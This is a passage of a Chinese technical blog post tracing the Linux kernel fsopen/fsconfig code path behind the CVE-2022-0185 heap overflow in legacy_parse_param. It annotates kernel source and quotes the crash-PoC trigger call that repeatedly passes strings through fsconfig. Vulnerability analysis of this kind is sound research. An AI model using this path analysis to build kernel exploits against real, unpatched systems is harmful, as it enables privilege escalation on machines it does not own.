s_iflags;	<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		lsm_flags;	<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span>	<span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span>	<span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;	<span class="hljs-comment">/* The phase the context is in */</span><br>	<span class="hljs-type">bool</span>			need_free:<span class="hljs-number">1</span>;	<span class="hljs-comment">/* Need to call ops-&gt;free() */</span><br>	<span class="hljs-type">bool</span>			global:<span class="hljs-number">1</span>;	<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>	<span class="hljs-type">bool</span>			oldapi:<span class="hljs-number">1</span>;	<span class="hljs-comment">/* Coming from mount(2) */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>看到上面代码后面有这样一段</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">...<br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br><span class="hljs-function"><span class="hljs-title">init_fs_context</span> = fc-&gt;</span><span class="hljs-function"><span class="hljs-title">fs_type</span>-&gt;</span>init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>	init_fs_context = legacy_init_fs_context;<br><br>ret = init_fs_context(fc);<br>...<br></code></pre></td></tr></table></figure>

<p>其中调用了我们fs_type-&gt;init_fs_context函数（但是该指针好像初始为0，所以一般init_fs_context会指向legacy_init_fs_context,该函数将会在之后漏洞介绍开始讲解），这是在新一代mount系统调用中增添的函数指针字段，之后就是初始化我们新创建的fs_context，然后返回给最初的fsopen系统调用</p>
<p>因此我们接着来分析后半段的fsopen</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">	<br>	...<br>	<br>	put_filesystem(fs_type);<br>	<span class="hljs-keyword">if</span> (IS_ERR(fc))<br>		<span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>	fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br>	ret = fscontext_alloc_log(fc);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_fc;<br><br>	<span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>	put_fs_context(fc);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>首先他会调用fscontext_alloc_log(fc),该函数的作用就是为该次文件系统上下文的log字段分配空间，然后将其中的log字段的owner指向当前文件系统类型(filesystem_type)的模块指针owner字段</p>
<p>之后我们调用fscontext_create_fd函数，其中存在以下调用链</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fscontext<span class="hljs-constructor">_create_fd(<span class="hljs-params">fc</span>, <span class="hljs-params">flags</span> &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : 0)</span><br>	anon<span class="hljs-constructor">_inode_getfd(<span class="hljs-string">&quot;[fscontext]&quot;</span>, &amp;<span class="hljs-params">fscontext_fops</span>, <span class="hljs-params">fc</span>, O_RDWR | <span class="hljs-params">o_flags</span>)</span><br>		<span class="hljs-constructor">__anon_inode_getfd(<span class="hljs-params">name</span>, <span class="hljs-params">fops</span>, <span class="hljs-params">priv</span>, <span class="hljs-params">flags</span>, NULL, <span class="hljs-params">false</span>)</span> 	<br></code></pre></td></tr></table></figure>

<p>其功能是为了返回一个同文件系统类型相联系的fd号，就跟咱们打开文件一样</p>
<h4 id="anon-inode-getfd"><a href="#anon-inode-getfd" class="headerlink" title="__anon_inode_getfd"></a>__anon_inode_getfd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fscontext_fops</span> =</span> &#123;<br>	.read		= fscontext_read,<br>	.release	= fscontext_release,<br>	.llseek		= no_llseek,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __anon_inode_getfd(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name,<br>			      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> file_operations *fops,<br>			      <span class="hljs-type">void</span> *priv, <span class="hljs-type">int</span> flags, 					<span class="hljs-comment">//这里priv就是之前创建的fscontext</span><br>			      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> inode *context_inode, 		<span class="hljs-comment">//为NULL，匿名inode</span><br>			      <span class="hljs-type">bool</span> secure)<br>&#123;<br>	<span class="hljs-type">int</span> error, fd;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><br>	error = get_unused_fd_flags(flags); 	<span class="hljs-comment">//获取空闲文件描述符</span><br>	<span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> error;<br>	fd = error;<br><br>	file = __anon_inode_getfile(name, fops, priv, flags, context_inode, secure);  <span class="hljs-comment">//获取一个[fscontext]的文件实例，其中的文件函数指针被设置为&quot;fscontext_fops&quot;</span><br>	<span class="hljs-keyword">if</span> (IS_ERR(file)) &#123;<br>		error = PTR_ERR(file);<br>		<span class="hljs-keyword">goto</span> err_put_unused_fd;<br>	&#125;<br>	fd_install(fd, file);<br><br>	<span class="hljs-keyword">return</span> fd;<br><br>err_put_unused_fd:<br>	put_unused_fd(fd);<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该函数整体的功能就是创建一个[fscontext]文件实例，然后返回fd号，这里也是同我们之前的fscontext创建了联系，创建联系的关键函数就是</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">__anon_inode_getfile(<span class="hljs-params">name</span>, <span class="hljs-params">fops</span>, <span class="hljs-params">priv</span>, <span class="hljs-params">flags</span>, <span class="hljs-params">context_inode</span>, <span class="hljs-params">secure</span>)</span><br></code></pre></td></tr></table></figure>

<p>该函数有这样一段代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">file-&gt;private_data <span class="hljs-operator">=</span> priv<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>其中file的private_date 被赋值为我们的priv，该字段通过咱们之前的分析是指向了先前创建的fscontext的，通过这一链接，我们就可以通过特殊的文件函数指针来进行相关操作了</p>
<p>这里总结一下fsopen的步骤</p>
<ol>
<li>获取相应的文件系统类型</li>
<li>构建文件系统上下文，fscontext，将其与上面的fstype通过字段相关联</li>
<li>获取[fscontext]文件，通过字段与fscontext相关联，且其中函数指针为一个全局虚函数表</li>
<li>返回上面文件的描述符fd，以后都是通过该描述符来进行操作</li>
</ol>
<p>调用链为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_fsopen<br>	get_fs_type 		<span class="hljs-comment">//获取fs_type</span><br>	fs_context_for_mount<br>		alloc_fs_context 	<span class="hljs-comment">//分配fscontext以及初始化部分字段</span><br>	fscontext_alloc_log 	<br>	fscontext_create_fd 	<br>		anon_inode_getfd<br>			__anon_inode_getfd 	<span class="hljs-comment">//创建文件与fscontext关联，并返回fd</span><br></code></pre></td></tr></table></figure>



<h3 id="2-fsconfig"><a href="#2-fsconfig" class="headerlink" title="2.fsconfig"></a>2.fsconfig</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * sys_fsconfig - 在一个上下文当中设置参数并且触发行动</span><br><span class="hljs-comment"> * @fd: 之前fsopen获得的文件系统上下文相关联的fd</span><br><span class="hljs-comment"> * @cmd: 指令</span><br><span class="hljs-comment"> * @_key: 键</span><br><span class="hljs-comment"> * @_value: 值</span><br><span class="hljs-comment"> * @aux: value参数的附加信息</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This system call is used to set parameters on a context, including</span><br><span class="hljs-comment"> * superblock settings, data source and security labelling.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Actions include triggering the creation of a superblock and the</span><br><span class="hljs-comment"> * reconfiguration of the superblock attached to the specified context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When setting a parameter, @cmd indicates the type of value being proposed</span><br><span class="hljs-comment"> * and @_key indicates the parameter to be altered.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @_value and @aux are used to specify the value, should a value be required:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_flag: No value is specified.  The parameter must be boolean</span><br><span class="hljs-comment"> *     in nature.  The key may be prefixed with &quot;no&quot; to invert the</span><br><span class="hljs-comment"> *     setting. @_value must be NULL and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_string：指定字符串值。 </span><br><span class="hljs-comment"> * 该参数可以是布尔值、整数、字符串或采用路径。 </span><br><span class="hljs-comment"> * 将尝试转换为适当的类型（可能包括作为路径查找）。 </span><br><span class="hljs-comment"> * @_value 指向以 NUL 结尾的字符串，@aux 必须为 0。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_binary: A binary blob is specified.  @_value points to the</span><br><span class="hljs-comment"> *     blob and @aux indicates its size.  The parameter must be expecting a</span><br><span class="hljs-comment"> *     blob.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path: A non-empty path is specified.  The parameter must be</span><br><span class="hljs-comment"> *     expecting a path object.  @_value points to a NUL-terminated string that</span><br><span class="hljs-comment"> *     is the path and @aux is a file descriptor at which to start a relative</span><br><span class="hljs-comment"> *     lookup or AT_FDCWD.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path_empty: As fsconfig_set_path, but with AT_EMPTY_PATH</span><br><span class="hljs-comment"> *     implied.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span><br><span class="hljs-comment"> *     NULL and @aux indicates the file descriptor.</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(fsconfig,<br>		<span class="hljs-type">int</span>, fd,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br>		<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br>		<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br>		<span class="hljs-type">int</span>, aux)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-type">int</span> lookup_flags = <span class="hljs-number">0</span>;<br><br>...<br></code></pre></td></tr></table></figure>



<h1 id="三、漏洞介绍"><a href="#三、漏洞介绍" class="headerlink" title="三、漏洞介绍"></a>三、漏洞介绍</h1><p>该漏洞适用于内核版本5.1，且至少持续到5.16，通过syzbot检测到并进行利用，其中洞主在<a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">博客</a>中首先给出了一个崩溃poc，但是我在5.4内核版本的linux当中无法触发，因此下面来尝试分析一下漏洞链条和自行编写触发漏洞poc</p>
<h2 id="1-崩溃链"><a href="#1-崩溃链" class="headerlink" title="1.崩溃链"></a>1.崩溃链</h2><p>首先对于fsopen在之前已经讲解的十分清楚，就是返回一个与fscontext相关联的fd而已，然后重要的就是后面的fsconfig系统调用，</p>
<p>可以看到上面poc中不停调用以下代码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fsconfig</span>(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, val, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>

<p>其中cmd指针传递的<code>FSCONFIG_SET_STRING</code>,这里注意我们的键值都不能为null，不然就直接返回错误了，大伙也可以自行去查看相关源码，</p>
<p>咱们只关心即将调用到的函数链条，在系统调用fsconfig当中，他会走到下面这段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">	<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>		.type	= fs_value_is_undefined,<br>	&#125;;<br>	<br>	...<br>	<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>		param.type = fs_value_is_string;<br>		param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br>		<span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>			ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br>			<span class="hljs-keyword">goto</span> out_key;<br>		&#125;<br>		param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br>		<span class="hljs-keyword">break</span>;<br>	...<br>	<br>		<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br>	<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123;<br>		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>		mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>	&#125;<br><br>...<br><br></code></pre></td></tr></table></figure>

<p>其中param字段的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 配置参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>		*key;		<span class="hljs-comment">/* 参数名称 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>	<span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;		<span class="hljs-comment">/* _value的类型 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-type">char</span>		*<span class="hljs-built_in">string</span>;<br>		<span class="hljs-type">void</span>		*blob;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span>	*<span class="hljs-title">name</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>	*<span class="hljs-title">file</span>;</span><br>	&#125;;<br>	<span class="hljs-type">size_t</span>	size;<br>	<span class="hljs-type">int</span>	dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中会调用到一个关键的开头函数<code>vfs_fsconfig_locked</code>,在该函数的switch当中会因为没有对应的case而走到default当中，并且在一般情况下这个if</p>
<p>条件是不满足的，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;<br>		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br>			<span class="hljs-keyword">return</span> -EBUSY;<br><br>		<span class="hljs-keyword">return</span> vfs_parse_fs_param(fc, param);<br>	&#125;<br>	fc-&gt;phase = FS_CONTEXT_FAILED;<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>导致后面会调用<code>vfs_parse_fs_param</code>函数</p>
<h3 id="vfs-parse-fs-param"><a href="#vfs-parse-fs-param" class="headerlink" title="vfs_parse_fs_param"></a>vfs_parse_fs_param</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!param-&gt;key)<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Unnamed parameter\n&quot;</span>);<br><br>	ret = vfs_parse_sb_flag(fc, param-&gt;key);<br>	<br>	...<br><br>	<span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>		ret = fc-&gt;ops-&gt;parse_param(fc, param);<br>		<span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br>	<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>他会调用fscontext中的ops函数表指向的parse_param函数，也就是解析我们传递的参数，这里fscontext所指向的表我们在之前分析fsopen的时候有讲到说在后面分析，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>	init_fs_context = legacy_init_fs_context;<br><br>ret = init_fs_context(fc);<br>...<br></code></pre></td></tr></table></figure>

<p>willsroot原话</p>
<blockquote>
<p>我们在漏洞利用中滥用的是 ext4。 我们最初的模糊测试崩溃发生在 Plan 9 文件系统上。 似乎在这两个文件系统（以及大量其他文件系统）中都没有设置 init_fs_context 字段，因此它们都默认为legacy并且可以沿着legacy_parse_param的路径走下去。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialise a legacy context for a filesystem that doesn&#x27;t support</span><br><span class="hljs-comment"> * fs_context.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>	fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br>	fc-&gt;ops = &amp;legacy_fs_context_ops;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>具体函数表如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>	.<span class="hljs-built_in">free</span>			= legacy_fs_context_free,<br>	.dup			= legacy_fs_context_dup,<br>	.parse_param		= legacy_parse_param,<br>	.parse_monolithic	= legacy_parse_monolithic,<br>	.get_tree		= legacy_get_tree,<br>	.reconfigure		= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>我们回到上面对于<code>vfs_parse_fs_param</code>的分析，他是调用了ops-&gt;parse_param函数，对应于函数表当中的<code>legacy_parse_param</code>函数，下面我们就来分析一下</p>
<h3 id="legacy-parse-param"><a href="#legacy-parse-param" class="headerlink" title="legacy_parse_param"></a>legacy_parse_param</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * 向旧配置添加参数。我们建立一个以逗号分隔的选项列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private; 	<span class="hljs-comment">//初始化时为zalloc分配的一段堆空间</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; 		<span class="hljs-comment">//第一次调用的时候，size应该还是0</span><br>	<span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> ret;<br><br>        ret = vfs_parse_fs_param_source(fc, param);<br>        <span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>            <span class="hljs-keyword">return</span> ret;<br><br>        <span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br>            <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br>	<span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br>	<span class="hljs-keyword">case</span> fs_value_is_string:<br>		len = <span class="hljs-number">1</span> + param-&gt;size; 			<span class="hljs-comment">//len被赋值为1+（_value）的长度</span><br>		fallthrough;<br>	<span class="hljs-keyword">case</span> fs_value_is_flag:<br>		len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>			      param-&gt;key);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>	    (param-&gt;type == fs_value_is_string &amp;&amp;<br>	     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>			      param-&gt;key);<br>	<span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) 